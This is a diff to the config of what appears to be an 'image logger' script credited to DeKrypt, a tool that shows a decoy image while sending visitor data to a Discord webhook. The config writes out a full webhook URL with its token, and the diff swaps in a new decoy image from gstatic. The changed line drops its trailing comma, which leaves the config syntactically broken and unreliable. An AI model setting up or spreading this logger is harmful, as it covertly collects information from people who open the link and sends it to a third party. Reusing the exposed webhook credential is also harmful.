@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1404626297233346610/ZQL3JOSVGQwVXQm_lXjJq4lcNzoS1bPUN0HEHlZPQNKfufeHVcmaHBg5csQE-5iO1GzA",
-    "image": "https://www.google.com/url?sa=i&url=https%3A%2F%2Fwww.ign.com%2Fwikis%2Fgrow-a-garden%2FHow_to_Unfavorite_Plants&psig=AOvVaw0dL8ilY3g34r1fJjz5SHvV&ust=1755248624090000&source=images&cd=vfe&opi=89978449&ved=0CBUQjRxqFwoTCKiA7On4iY8DFQAAAAAdAAAAABAE", # You can also have a custom image by using a URL argument
+    "image": "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcS0dMnl8FJUYwUrYMOHqzVo9OY2p9wCrOR13RfFvaNzTV6oxq4PfHiemoS_ep9EBKb517I&usqp=CAU"
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
